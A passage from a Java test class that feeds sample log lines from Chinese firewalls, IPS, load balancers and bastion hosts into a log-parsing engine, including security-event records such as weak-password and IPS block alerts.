      data = "{\"event_type_id\":60004047,\"log_type\":\"dac_weakpasswd\",\"raw_id\":\"0\",\"src_ip\":\"10.0.201.228\",\"src_ip_v6\":\"\",\"dst_ip\":\"10.3.131.3\",\"dst_ip_v6\":\"\",\"src_ip_country\":\"内网\",\"src_ip_city\":\"\",\"src_ip_latitude\":\"\",\"src_ip_longitude\":\"\",\"dst_ip_country\":\"内网\",\"dst_ip_city\":\"\",\"dst_ip_latitude\":\"\",\"dst_ip_longitude\":\"\",\"src_port\":27990,\"dst_port\":80,\"src_mac\":\"02:1a:c5:01:00:00\",\"dst_mac\":\"02:1a:c5:02:00:00\",\"vlan_id\":0,\"protocol\":\"HTTP\",\"subject\":\"http_login\",\"username\":\"aguest\",\"weakpwd_result\":1,\"weakpwd_source\":3,\"login_status\":\"1\",\"start_time\":1666771118,\"dev_ip\":\"10.5.20.233\",\"dev_type\":\"APT\",\"index_date\":\"2022-10-26\",\"uuid\":\"\",\"rec_id\":\"\",\"http_host\":\"\",\"log_status\":\"待处置\"}";
      parse(botuEngine, data);
      data = "{\"src_ip\": \"192.100.10.180\",\"src_ip_v6\": \"\",\"dst_ip\": \"192.168.20.9\",\"dst_ip_v6\": \"\",\"src_ip_country\": \"中国\",\"src_ip_city\": \"北京市\",\"dst_ip_country\": \"内网\",\"dst_ip_city\": \"内网\",\"src_port\": 57690,\"dst_port\": 36987,\"src_mac\": \"18:db:f2:5a:fb:72\",\"dst_mac\": \"38:ad:be:31:a9:41\",\"exploited_host\": 0,\"exploited_ip\": \"\",\"event_type_id\": 1007728,\"src_host_identity\": 1,\"dst_host_identity\": 2,\"attack_port\": 57690,\"attacked_port\": 36987,\"event_level_name\": \"中危\",\"security_id\": 20402,\"security_type\": \"信息泄露\",\"attack_type\": \"敏感信息泄露\",\"protocol\": \"UDP\",\"subject\": \"UDP_NFS_共享文件服务敏感信息泄露漏洞尝试\",\"attck\": \"\",\"detect_att_fail\": 0,\"apptype\": \"webAttack,attackViews\",\"stage_name\": \"\",\"stage_sub_name\": \"\",\"currency_name\": \"\",\"cve\": \"CVE-1999-0554\",\"message\": \"7564702E7061796C6F61643DB6178AA8000000000000000200\",\"mpls\": \"\",\"vlan\": \"\",\"attack_status\": \"攻击尝试\",\"organizations\": \"\",\"families\": \"\",\"categories\": \"\",\"ioc\": \"\",\"threat_score\": 0,\"intelligence_type_tag\": 0,\"raw_id\": \"jrwmujpwz40z48x24341b6ce11b58f82\",\"log_type\": \"event-log\",\"start_time\": 1666684091,\"dev_ip\": \"10.5.20.233\",\"dev_type\": \"APT\",\"index_date\": \"2022-10-25\",\"log_status\": \"待处置\"}";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testADDptech() {
    String parserFile = "./resources/parsers/antidos_dptech_probe3000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "Jul 22 08:57:04 2012 DPTECH %%IPS/ATTACK/2/SRVLOG(l): log-type:attack-protect;``event:block;``attack-name:(402653194)Apache CGI Byterange Request¾Ü¾ø·þÎñÂ©¶´;``protocol-name:(1375731729)ÍøÒ³ä¯ÀÀ;`` ip-proto-id:6;``source-ip:4-0a010164;``source-port:7590;``destination-ip:4-0a0101c8;``destination-port:80;``ifname-inside:eth2_12;``packet:////////AFI00NHVCABFAABElXdAADMGiRDawXZNynENrBW6ABVYKcIUgLozVYAY+p7T/wAAAQEICgAAmbsAR3jeVVNFUiBhbm9ueW1vdXMNCg==;``summary-count:1;``summary-offset:0;``";
      parse(botuEngine, data);
      data = "Jul 22 09:08:57 2012 DPTECH %%IPS/AV/1/SRVLOG(l): log-type:av-protect;``event:block;``av-name:(20134518)Email-Worm.Win32.Sober.g;``protocol-name:(1375731729)FTP;``ip-proto-id:6;``source-ip:10.11.100.121;``source-port:4091;``destination-ip:10.11.101.122;``destination-port:80;``ifname-inside:eth2_12;``summary-count:1;``summary-offset:0;``";
      parse(botuEngine, data);
      data = "Dec 04 12:10:29 10.11.3.33 2012-01-06 01:35:32 DPTECH %%--IPS/WEB/3/OPERLOG(l): client-type(84):web;user-name(85):admin;host-ip(86):10.11.100.75;error-code(87):0;User: [admin] (IP address: 10.11.100.75 ) logged out.";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //启明星辰防火墙
  public void testVenusFirewallSyslog() {
    String parserFile = "./resources/parsers/firewall_venus_firewall_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<318>Apr 13 15:44:42 FW-11 FILTER: SerialNum=100105002000001810300382 GenTime= 2020-04-13 15:44:42  SrcIP=192.168.1.64 DstIP=192.168.16.11 Protocol=TCP SrcPort=55097 DstPort=443 PolicyID=1 Action=PERMIT Content= Session Setup";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //建恒信安
  public void testJhsecSyslog() {
    String parserFile = "./resources/parsers/bastion_jhsec_jh-oam_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "globalSid=00-ba500d7c-0ba1-4cb6-9171-1a45b8716832 sid=00-nwwz5vg1 beginTime=1586750516262 protocol=webapp personUid=wangan personUip=192.168.16.9 resType=webapp resEdition=DMZ主防火墙 resName=DMZ主防火墙 resIp=192.168.16.11 acc=admin";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //网康下一代防火墙
  public void testNetentSecFirewallSyslog() {
    String parserFile = "./resources/parsers/firewall_netentsec_ngfw_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<11> 0,1586592175,NGFWxai_update,3,,NSLOG_SYSLOG ID=NS_DPI_UPDATE_ERR,PARA=21 no server alive.";
      parse(botuEngine, data);
      data = "<11> 0,1586592067,NGFWips_update,3,,NSLOG_SYSLOG ID=IPS_UPDATE_ERR,PARA=failed_download_ips_version.info_from_server";
      parse(botuEngine, data);
      data = "<13> 0,1586506148,NGFWcontent_engine_ctl,5,,NSLOG_SYSLOG ID=,PARA=content_engine url_update update regularly.";
      parse(botuEngine, data);
      data = "<13> 0,1586408812,NGFWweb_login,5,,NSLOG_SYSLOG ID=NS_GUI_LOGIN_SUCCESS,PARA=192.168.1.64;admin;6";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //深信服负载均衡
  public void testLbSangfor() {
    String parserFile = "./resources/parsers/lb_sangfor_ad_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<132>Jan 18 20:01:37 src@sangfor-ad1 : LINKD: [ 联通 ]恢复正常，上次是监视器超时导致离线, 类型 [ICMP]";
      parse(botuEngine, data);
      data = "<132>Apr 13 11:01:24 src@sangfor-ad1 : LINKD: [ 联通 ]离线，原因是监视器超时, 类型 [ICMP]";
      parse(botuEngine, data);
      data = "<132>Apr 13 06:58:45 src@sangfor-ad1 : DNS_MONITOR: DNS服务器[202.106.0.20]恢复正常";
      parse(botuEngine, data);
      data = "<132>Apr 13 11:01:23 src@sangfor-ad1 : DNS_MONITOR: DNS服务器[202.106.0.20]离线";
      parse(botuEngine, data);
      data = "<134>Apr 13 04:02:34 src@sangfor-ad1 : SYS: 备份配置成功";
      parse(botuEngine, data);
      data = "<133>Apr  9 13:20:12 src@sangfor-ad1 :  admin ,  192.168.1.64 ,  查看 ,  系统配置 ,  查看Syslog设置";
      parse(botuEngine, data);
      data = "<133>Apr  9 13:20:09 src@sangfor-ad1 :  admin ,  192.168.1.64 ,  查看 ,  系统配置 ,  查看HTTP日志列表";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //天融信负载均衡
  public void testLbTopsec() {
    String parserFile = "./resources/parsers/lb_topsec_topapp[3.2294.30096_tad.1]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "id=\"ngtos\" version=\"1.0\" time=\"2017-05-16 16:14:33\" dev=\"TopsecOS\" pri=\"notice\" type=\"mgmt\" recorder=\"config\" vsid=\"0\" user=\"superman\" src=\"127.0.0.1\" result=\"0\" msg=\"helpmode chinese \"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2017-05-16 16:14:14\" dev=\"TopsecOS\" pri=\"notice\" type=\"mgmt\" recorder=\"mgmt\" vsid=\"0\" user=\"superman\" src=\"127.0.0.1\" op=\"login\" method=\"2\" result=\"1000\" msg=\"login success.\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2017-05-16 16:14:14\" dev=\"TopsecOS\" pri=\"notice\" type=\"mgmt\" recorder=\"linkbak\" vsid=\"0\" msg=\"linkbak_id=1,master_id=2,slave_id=3,using_id=3,dst=1.1.1.1 Link State UNKNOW\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2017-05-16 17:49:05\" dev=\"TopsecOS\" pri=\"information\" type=\"pf\" recorder=\"pf\" vsid=\"0\" src=\"192.168.105.227\" dst=\"192.168.105.228\" sport=\"63797\" dport=\"443\" smac=\"40:a8:f0:69:2f:86\" dmac=\"98:30:00:11:00:30\" protoid=\"6\" sdev=\"feth0\" op=\"permit\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2015-02-05 17:29:35\" dev=\"TopsecOS\" pri=\"warning\" type=\"ha\" recorder=\"ha\" vsid=\"0\" msg=\"ha start OK\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2015-02-05 17:29:35\" dev=\"TopsecOS\" pri=\"alarm\" type=\"ha\" recorder=\"ha\" vsid=\"0\" msg=\"group 99 status priority changed from 65000 to 64980\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"2.0\" time=\"2017-07-18 16:22:48\" dev=\"TopsecOS\" pri=\"information\" type=\"license_update\" recorder=\"license\" vsid=\"0\" op=\"update\"  msg=\"license update success.\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"2.0\" time=\"2017-07-18 17:08:22\" dev=\"TopsecOS\" pri=\"information\" type=\"topguard\" recorder=\"topguard\" vsid=\"0\" op=\"update\"  msg=\"have a new upgrade.\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2017-06-01 15:01:37\" dev=\"TopsecOS\" pri=\"notice\" type=\"firmware_update\" recorder=\"firmware\" vsid=\"0\" op=\"update\" result=\"0\" msg=\"update success.\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2227.2203_NGFW.1_CSM_debug\" time=\"2017-06-27 14:38:07\" dev=\"TopsecOS\" pri=\"alarm\" type=\"interface\" recorder=\"interface\" vsid=\"0\" interface=\"feth0\" op=\"up\" speed=\"100 Mbps\" duplex=\"Full Duplex\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2227.2203_NGFW.1_CSM_debug\" time=\"2017-06-27 14:38:07\" dev=\"TopsecOS\" pri=\"alarm\" type=\"neighbour\" recorder=\"neighbour\" vsid=\"0\" interface=\"feth0\" ip=\"15:45:45:78:48:15\" msg=\"Duplicate IP address\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-31 11:53:51\" dev=\"TopAPP\" pri=\"debug\" type=\"poap_runtime\" recorder=\"poap_runtime\" vsid=\"0\" age=\"0\" section=\"poap config management precinct engine init\" action=\"write TopApp Proxy config file success.\" objtype=\"0\" objname=\" \" result=\"success\" result_code=\"517001\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"2.2\" time=\"2017-06-25 10:30:34\" dev=\"TopAPP\" pri=\"information\" type=\"vcm\" recorder=\"vcm \" vsid=\"0\" msg=\"Collecting vm info for vs01 has lasted 50 seconds\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-23 12:01:25\" dev=\"TopAPP\" pri=\"information\" type=\"lfm\" recorder=\"lfm\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"51018\" dst=\"3.3.3.1\" dstport=\"80\" protocol=\"tcp\" action=\"process new session\" result=\"success\" result_code=\"532000\" vsname=\"TopAD_FL4_VS\" mbip=\"2.2.2.3\" mbport=\"8081\" snatip=\" \"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"2.2\" time=\"2017-05-08 09:16:42\" dev=\"TopAPP\" pri=\"information\" type=\"eos\" recorder=\"eos\" vsid=\"0\" objtype=\"成员\" objname=\"node_01:80\" eos_chkname=\"icmp_chk_cfg\" method=\"ICMP\" action=\"health_check\" result=\"fail\" result_code=\"-507816\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-23 12:21:26\" dev=\"TopAPP\" pri=\"debug\" type=\"outbound\" recorder=\"outbound\" vsid=\"0\" outboundtype=\"Link Outbound\" src=\"3.3.3.2\" srcport=\"21510\" dst=\"2.2.2.3\" dstport=\"8\" protocol=\"1\" action=\"null\" objname=\"ob\" result=\"success\" result_code=\"522018\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-25 06:36:25\" dev=\"TopAPP\" pri=\"information\" type=\"dns\" recorder=\"bind\" vsid=\"0\" msg=\"client 10.10.10.105#50372 (www.ad.163.com): view view: query: www.ad.163.com IN A + (10.10.10.229)\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"2.2\" time=\"2017-05-08 09:16:42\" dev=\"TopAPP\" pri=\"warning\" type=\"inbound\" recorder=\"wideip_module\" vsid=\"0\" query_domain=\"www.baidu.com\" zone=\"www.baidu.com\" action=\"查询记录\" resource=\"10.20.11.23\" result=\"0\" result_code=\"success\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"2.0\" time=\"2017-05-24 16:04:38\" dev=\"TopAPP\" pri=\"information\" type=\"statistics\" recorder=\"statistics\" vsid=\"0\" objname=\"pf\" action=\"it can work\" result=\"success\" result_code=\"100\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"2.0\" time=\"2017-05-24 16:04:38\" dev=\"TopAPP\" pri=\"information\" type=\"proxy\" recorder=\"proxy\" vsid=\"0\" msg=\"Close down expect connection.\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"2.0\" time=\"2017-05-24 16:04:38\" dev=\"TopAPP\" pri=\"information\" type=\"poap_agent\" recorder=\"poap_agent\" vsid=\"0\" objname=\"vs1\" objtype=\"vs\"  action=\"1\" result=\"1\" result_code=\"success\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:34:24\" dev=\"TopAPP\" pri=\"debug\" type=\"fproxy\" recorder=\"fproxy\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"55489\" dst=\"3.3.3.1\" dstport=\"80\" protocol=\"tcp\" action=\"request success\" result=\"success\" result_code=\"533004\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:36:57\" dev=\"TopAPP\" pri=\"error\" type=\"wave\" recorder=\"wave\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"55517\" dst=\"2.2.2.3\" dstport=\"8081\" objname=\"2223_node\" queue_len=\"1\" action=\"store request to queue\" result=\"failed\" result_code=\"-534030\"";
      parse(botuEngine, data);
      //data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:53:53\" dev=\"TopAPP\" pri=\"debug\" type=\"dns_proxy\" recorder=\"dns_Proxy\" vsid=\"0\" dns_proxy_type=\"DNS Proxy\" src=\"3.3.3.2\" srcport=\"53\" dst=\"4196489\" dstport=\"80\" protocol=\"6\" action=\"nat\" objname=\"dns query\" result=\"failed\" result_code=\"0\"";
      //parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-31 11:56:15\" dev=\"TopAPP\" pri=\"information\" type=\"vpn_packet\" recorder=\"vpn\" vsid=\"0\" msg=\"SID-ROOT-3,SID-LOCALBRIDGE-1,5ECDBD866AE9,005056C00004,0x86DD,86,TCP_CONNECTv6,SYN+ACK,fe80::2d97:a1c6:24b5:8e51,5357,fe80::ccf3:b284:1c07:e8be,50168,3784278864,269398587,WindowSize=65535,-,3.3.3.3,-\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-31 11:58:12\" dev=\"TopAPP\" pri=\"information\" type=\"vpn_security\" recorder=\"vpn\" vsid=\"0\" msg=\"Session \\\"SID-ROOT-4\\\": A new MAC address \\\"5E-CD-BD-86-6A-E9\\\" has been assigned.\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-31 11:59:12\" dev=\"TopAPP\" pri=\"information\" type=\"vpn_server\" recorder=\"vpn\" vsid=\"0\" msg=\"Connection \\\"CID-15\\\" has been terminated.";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 06:15:30\" dev=\"TopAPP\" pri=\"information\" type=\"ad_ac\" recorder=\"ac\" vsid=\"0\" objname=\"231\" protocol=\"1\" indev=\"feth2\" src=\"3.3.3.2\" srcport=\"30249\" dst=\"2.2.2.3\" dstport=\"8\" action=\"matched\" result=\"deny\" result_code=\"550110\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:35:12\" dev=\"TopAPP\" pri=\"debug\" type=\"fproxy_http\" recorder=\"fproxy_http\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"55496\" dst=\"3.3.3.1\" dstport=\"80\" action=\"dir from server\" result=\"warning\" result_code=\"-533989\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 07:59:15\" dev=\"TopAPP\" pri=\"debug\" type=\"gslb_wideip\" recorder=\"gslb_wideip_module\" vsid=\"0\" query_domain=\"新浪微博\" zone=\"topsec\" action=\"query record after\" resource=\"172.18.2.55\" result=\"failed\" result_code=\"-525006\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 07:45:28\" dev=\"TopAPP\" pri=\"information\" type=\"info_sync\" recorder=\"info_sync\" vsid=\"0\" src_node=\"192.168.90.1\" dst_node=\"192.168.90.36\" action=\"recv config sync msg\" result=\"none\" result_code=\"526059\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 06:58:42\" dev=\"TopAPP\" pri=\"emergent\" type=\"cpu_monitor\" recorder=\"cpu_monitor\" vsid=\"0\" msg=\"cpu occupancy rate too high\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 07:01:28\" dev=\"TopAPP\" pri=\"emergent\" type=\"memory_monitor\" recorder=\"memory_monitor\" vsid=\"0\" msg=\"memory occupancy rate too high\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 07:00:13\" dev=\"TopAPP\" pri=\"emergent\" type=\"disk_monitor\" recorder=\"disk_monitor\" vsid=\"0\" msg=\"disk occupancy rate too high\"";
      parse(botuEngine, data);

      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 07:15:18\" dev=\"TopAPP\" pri=\"error\" type=\"db_sec\" recorder=\"db_sec\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"57160\" dst=\"2.2.2.3\" dstport=\"80\" dbtype=\"none\" msg=\"protocol do not distinguish\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:44:38\" dev=\"TopAPP\" pri=\"warning\" type=\"db_sec_match\" recorder=\"db_sec_match\" vsid=\"0\" src=\"3.3.3.3\" srcport=\"55587\" dst=\"2.2.2.3\" dstport=\"80\" dbtype=\"MySQL\" zone=\"afwf\" action=\"permit\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 05:51:31\" dev=\"TopAPP\" pri=\"information\" type=\"ad_ctrlsess\" recorder=\"control-session\" vsid=\"0\" policyid=\"20547\" condition_type=\"dst addr obj\" user=\" \" cs_obj=\"2.2.2.3\" action=\"connection number already reached threshold\" result=\"warning\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 07:04:27\" dev=\"TopAPP\" pri=\"information\" type=\"ddos_atk\" recorder=\"DDoS_atk\" vsid=\"0\" dst_addr=\"3.3.3.2\" zonename=\"topsec\" attack_status=\"begin\" src_addr=\"\" service=\"\" attack_type=\"ip\" total_packets=\"4196510\" total_bytes=\"4196504\" data_action=\"detect\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-23 12:05:45\" dev=\"TopAPP\" pri=\"information\" type=\"admin\" recorder=\"admin_login\" vsid=\"0\" user=\"superman\" src=\"192.168.90.39\" op=\"local login\" method=\"WEBUI\" result=\"1000\" description=\"login success\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 03:41:13\" dev=\"TopAPP\" pri=\"information\" type=\"admin\" recorder=\"admin_pwd\" vsid=\"0\" user=\"liuliu\" result=\"0\" description=\"modify self passwd success.\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2242.30019_TAD_20181019_1721.1\" time=\"2018-10-24 02:56:15\" dev=\"TopAPP\" pri=\"information\" type=\"session\" recorder=\"session\" vsid=\"0\" src=\"3.3.3.2\" dst=\"2.2.2.3\" trans_sip=\"3.3.3.1\" trans_dip=\"2.2.2.1\" proto=\"tcp\" sport=\"80\" dport=\"80\" trans_sport=\"80\" trans_dport=\"80\" rcv_pkt=\"1022\" send_pkt=\"333\" rcv_bytes=\"105869\" send_bytes=\"65748\" duration=\"20\" op=\"create\" appname=\"null\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //天融信堡垒机
  public void testBastionTopsec() {
    String parserFile = "./resources/parsers/bastion_topsec_topsag[3.0.2.125_sag_x86_mod]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      // 用户登录/登出
      String data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:50:46\" dev=\"TopsecOS\" pri=\"info\" type=\"user_login\" recorder=\"user_auth\" vsid=\"\" vsys_name=\"default\" subtype=\"用户登录\" op=\"login\" user=\"operator\" src=\"192.168.151.100\" result=\"0\" msg=\"登录用户失败\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:42:40\" dev=\"TopsecOS\" pri=\"alert\" type=\"omgt\" recorder=\"sso\" vsid=\"\" vsys_name=\"default\" subtype=\"单点登录\" op=\"sso\" user=\"admin\" src=\"192.168.151.110\" result=\"1000\" msg=\"访问资产成功\" assetIp=\"192.168.151.101\" assetName=\"192.168.151.101\" protoname=\"RDP\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:42:49\" dev=\"TopsecOS\" pri=\"info\" type=\"omgt\" recorder=\"examine\" vsid=\"\" vsys_name=\"default\" subtype=\"运维审批\" op=\"set\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"修改审批状态成功\" account=\"root\" state=\"允许\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:43:56\" dev=\"TopsecOS\" pri=\"info\" type=\"mgmt\" recorder=\"user\" vsid=\"\" vsys_name=\"default\" subtype=\"用户管理\" op=\"set\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"修改用户成功\" name=\"operator\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:44:03\" dev=\"TopsecOS\" pri=\"info\" type=\"mgmt\" recorder=\"usergroup\" vsid=\"\" vsys_name=\"default\" subtype=\"用户管理\" op=\"set\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"修改用户组成功\" groupName=\"fsdcsde\" userName=\"keyadmin\" department=\"defaultDept\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:43:15\" dev=\"TopsecOS\" pri=\"info\" type=\"mgmt\" recorder=\"department\" vsid=\"\" vsys_name=\"default\" subtype=\"用户管理\" op=\"set\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"修改部门成功\" name=\"d\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:44:24\" dev=\"TopsecOS\" pri=\"info\" type=\"mgmt\" recorder=\"role\" vsid=\"\" vsys_name=\"default\" subtype=\"用户管理\" op=\"add\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"创建角色成功\" name=\"222\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:44:44\" dev=\"TopsecOS\" pri=\"info\" type=\"mgmt\" recorder=\"attestation\" vsid=\"\" vsys_name=\"default\" subtype=\"用户管理\" op=\"set\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"编辑AD域认证成功\" name=\"\" ip=\"1.1.1.1\" port=\"111\" attestationType=\"AD域认证\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:45:36\" dev=\"TopsecOS\" pri=\"notice\" type=\"mgmt\" recorder=\"network\" vsid=\"\" vsys_name=\"default\" subtype=\"资产管理\" op=\"del\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"删除网络成功\" name=\"333\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:45:47\" dev=\"TopsecOS\" pri=\"notice\" type=\"mgmt\" recorder=\"asset\" vsid=\"\" vsys_name=\"default\" subtype=\"资产管理\" op=\"lock\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"修改资产状态成功\" assetName=\"1\" assetIp=\"1.1.1.1\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:47:01\" dev=\"TopsecOS\" pri=\"info\" type=\"mgmt\" recorder=\"assetgroup\" vsid=\"\" vsys_name=\"default\" subtype=\"资产管理\" op=\"set\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"修改资产组成功\" name=\"测试资产组1\" assetName=\"FTP\" department=\"defaultDept\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:48:56\" dev=\"TopsecOS\" pri=\"notice\" type=\"mgmt\" recorder=\"passwordChange\" vsid=\"\" vsys_name=\"default\" subtype=\"资产管理\" op=\"lock\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"修改改密状态成功\" name=\"232323\" state=\"停用\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:50:14\" dev=\"TopsecOS\" pri=\"info\" type=\"mgmt\" recorder=\"application\" vsid=\"\" vsys_name=\"default\" subtype=\"资产管理\" op=\"set\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"修改应用成功\" name=\"192.168.78.135\" ip=\"192.168.78.135\" state=\"停用\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:49:27\" dev=\"TopsecOS\" pri=\"info\" type=\"mgmt\" recorder=\"passwordEnvelope\" vsid=\"\" vsys_name=\"default\" subtype=\"资产管理\" op=\"send\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"发送密码信封成功\" name=\"333\" asset=\"179\"";
